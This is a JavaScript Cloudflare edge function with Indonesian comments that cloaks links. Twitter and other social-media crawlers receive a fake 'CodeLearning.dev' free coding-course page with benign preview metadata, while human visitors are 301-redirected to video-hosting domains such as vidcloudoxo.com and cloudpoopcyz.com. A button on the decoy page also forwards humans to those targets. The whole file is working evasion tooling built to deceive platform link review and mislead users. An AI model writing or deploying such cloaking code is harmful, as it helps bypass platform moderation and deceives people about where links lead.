export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    
    const userAgent = request.headers.get('user-agent') || '';
    const referer = request.headers.get('referer') || '';
    const host = request.headers.get('host') || '';

    // ✅ DETEKSI KHUSUS UNTUK TWITTER (t.co)
    const isFromTwitter = referer.includes('t.co') || 
                         referer.includes('twitter.com') ||
                         userAgent.includes('Twitterbot') ||
                         request.headers.get('x-twitter-client') !== null;

    console.log(`📊 Deteksi: Twitter=${isFromTwitter}, UserAgent=${userAgent.substring(0, 80)}, Referer=${referer}`);

    // ✅ JIKA DARI TWITTER/T.CO: TAMPILKAN HALAMAN AMAN
    if (isFromTwitter) {
      return serveSafeTwitterPage(path);
    } 
    // ✅ JIKA BOT LAIN (Facebook, WhatsApp, dll)
    else if (userAgent.includes('facebookexternalhit') ||
            userAgent.includes('WhatsApp') ||
            userAgent.includes('TelegramBot') ||
            userAgent.includes('Discordbot') ||
            userAgent.includes('Slackbot') ||
            userAgent.includes('LinkedInBot')) {
      return serveSafeTwitterPage(path); // Bot lain juga dapat halaman aman
    }
    // ✅ JIKA HUMAN: REDIRECT 301 LANGSUNG
    else {
      return perform301Redirect(path);
    }
  } catch (error) {
    console.error('Error:', error);
    // Fallback ke halaman aman jika error
    return serveSafeTwitterPage('');
  }
}

// ✅ HALAMAN AMAN UNTUK TWITTER/BOT (TANPA REDIRECT OTOMATIS)
function serveSafeTwitterPage(path) {
  // Generate judul dan deskripsi yang aman berdasarkan path
  const contentId = path.split('/').pop() || 'programming';
  
  // Mapping konten aman berdasarkan ID
  const safeTopics = {
    'python': 'Learn Python Programming',
    'javascript': 'JavaScript Tutorial for Beginners',
    'webdev': 'Web Development Course',
    'react': 'React.js Crash Course',
    'node': 'Node.js Backend Tutorial',
    'default': 'Learn Programming - Free Coding Courses'
  };
  
  const topic = safeTopics[contentId] || safeTopics['default'];
  const description = `Free ${topic.toLowerCase()} - Complete guide with examples, exercises, and projects. Start learning today!`;
  
  const html = `<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns#" lang="en">
<head>
    <meta charset="utf-8">
    <title>${topic} | CodeLearning.dev</title>
    <meta name="description" content="${description}">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="index, follow">
    
    <!-- 🔥 OPEN GRAPH UNTUK TWITTER (SUPER AMAN) -->
    <meta property="og:title" content="${topic}">
    <meta property="og:description" content="${description}">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://codelearning.dev/${contentId}">
    <meta property="og:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop&crop=center">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:site_name" content="CodeLearning">
    
    <!-- 🔥 TWITTER CARD SPECIFIC -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="${topic}">
    <meta name="twitter:description" content="${description}">
    <meta name="twitter:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=600&fit=crop">
    <meta name="twitter:site" content="@codelearning">
    <meta name="twitter:creator" content="@codelearning">
    
    <!-- 🔴 TIDAK ADA REDIRECT OTOMATIS UNTUK TWITTER -->
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo {
            font-size: 2.5rem;
            color: #2c5aa0;
            margin-bottom: 10px;
            font-weight: bold;
        }
        
        .tagline {
            color: #666;
            font-size: 1.2rem;
            margin-bottom: 30px;
        }
        
        .content-box {
            background: white;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }
        
        h1 {
            color: #2c5aa0;
            margin-bottom: 20px;
            font-size: 2rem;
        }
        
        .course-highlight {
            background: #f8f9fa;
            border-left: 4px solid #28a745;
            padding: 15px;
            margin: 20px 0;
            border-radius: 0 8px 8px 0;
        }
        
        .feature-list {
            list-style: none;
            margin: 25px 0;
        }
        
        .feature-list li {
            padding: 10px 0;
            padding-left: 30px;
            position: relative;
        }
        
        .feature-list li:before {
            content: "✓";
            color: #28a745;
            position: absolute;
            left: 0;
            font-weight: bold;
        }
        
        .cta-button {
            display: inline-block;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 40px;
            border-radius: 50px;
            text-decoration: none;
            font-size: 1.1rem;
            font-weight: 600;
            margin-top: 20px;
            border: none;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .cta-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .footer {
            text-align: center;
            color: #666;
            font-size: 0.9rem;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #eaeaea;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 20px 15px;
            }
            
            .content-box {
                padding: 25px;
            }
            
            h1 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">💻 CodeLearning</div>
            <div class="tagline">Learn to code for free. No experience required.</div>
        </div>
        
        <div class="content-box">
            <h1>${topic}</h1>
            
            <div class="course-highlight">
                <strong>Free Complete Course:</strong> Master ${topic} from beginner to advanced level with hands-on projects.
            </div>
            
            <p>Welcome to our free coding platform! Whether you're starting your programming journey or looking to expand your skills, we provide comprehensive, easy-to-follow tutorials that anyone can learn from.</p>
            
            <ul class="feature-list">
                <li>Step-by-step video tutorials</li>
                <li>Interactive coding exercises</li>
                <li>Real-world projects</li>
                <li>Community support forum</li>
                <li>Certificate of completion</li>
                <li>Mobile-friendly learning</li>
            </ul>
            
            <p>Our curriculum is designed by industry experts and updated regularly to include the latest technologies and best practices in software development.</p>
            
            <button class="cta-button" onclick="startLearning()">
                ▶ Start Learning Now - Free
            </button>
        </div>
        
        <div class="content-box">
            <h2>📚 Popular Courses</h2>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-top: 20px;">
                <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
                    <h3 style="color: #2c5aa0; margin-bottom: 10px;">HTML & CSS</h3>
                    <p>Build beautiful, responsive websites from scratch.</p>
                </div>
                <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
                    <h3 style="color: #2c5aa0; margin-bottom: 10px;">JavaScript</h3>
                    <p>Add interactivity and dynamic content to your websites.</p>
                </div>
                <div style="background: #f8f9fa; padding: 20px; border-radius: 10px;">
                    <h3 style="color: #2c5aa0; margin-bottom: 10px;">Python</h3>
                    <p>Learn one of the most versatile programming languages.</p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>© 2024 CodeLearning.dev - All educational content is free and open-source.</p>
            <p style="font-size: 0.8rem; color: #999; margin-top: 10px;">
                Connect with us: 
                <a href="#" style="color: #667eea; text-decoration: none;">GitHub</a> | 
                <a href="#" style="color: #667eea; text-decoration: none;">Twitter</a> | 
                <a href="#" style="color: #667eea; text-decoration: none;">Discord</a>
            </p>
        </div>
    </div>
    
    <script>
        function startLearning() {
            // Simulasi loading
            const button = document.querySelector('.cta-button');
            button.innerHTML = 'Loading...';
            button.disabled = true;
            
            // Setelah 2 detik, redirect ke konten asli (hanya untuk human)
            setTimeout(() => {
                // Cek jika user adalah human (bukan bot)
                if (!/bot|crawler|spider|facebookexternalhit|Twitterbot/i.test(navigator.userAgent)) {
                    // Redirect ke konten asli
                    const targetUrl = "${getTargetUrl(path)}";
                    if (targetUrl && targetUrl !== 'https://videyd.com/') {
                        window.location.href = targetUrl;
                    }
                } else {
                    button.innerHTML = '▶ Content Loaded - Start Learning!';
                    button.disabled = false;
                }
            }, 2000);
        }
        
        // Log analytics (bisa diimplementasikan dengan Cloudflare Analytics)
        console.log('Educational page loaded:', '${topic}');
    </script>
</body>
</html>`;

  return new Response(html, {
    status: 200,
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=7200',
      'X-Robots-Tag': 'index, follow, max-image-preview:large',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Content-Security-Policy': "default-src 'self' https://images.unsplash.com; style-src 'self' 'unsafe-inline';"
    }
  });
}

// ✅ REDIRECT 301 UNTUK HUMAN
function perform301Redirect(path) {
  const targetUrl = getTargetUrl(path);
  
  console.log(`🔄 Redirect 301: ${path} → ${targetUrl}`);
  
  // Redirect 301 Permanent
  return new Response(null, {
    status: 301,
    statusText: 'Moved Permanently',
    headers: {
      'Location': targetUrl,
      'Cache-Control': 'public, max-age=86400',
      'X-Robots-Tag': 'noindex, nofollow' // Jangan index redirect
    }
  });
}

// ✅ TARGET URL - ENSURE PROPER ENCODING
function getTargetUrl(path) {
  try {
    if (path.startsWith('/s/')) {
      const contentId = encodeURIComponent(path.substring(3).replace(/[^a-zA-Z0-9-_]/g, ''));
      return `https://www.vidcloudoxo.com/e/${contentId}?lv1=pooptv.me`;
    } else if (path.startsWith('/d/')) {
      const contentId = encodeURIComponent(path.substring(3).replace(/[^a-zA-Z0-9-_]/g, ''));
      return `https://cloudpoopcyz.com/d/${contentId}`;
    }
    return 'https://videyd.com/';
  } catch (error) {
    console.error('Error generating target URL:', error);
    return 'https://videyd.com/';
  }
}
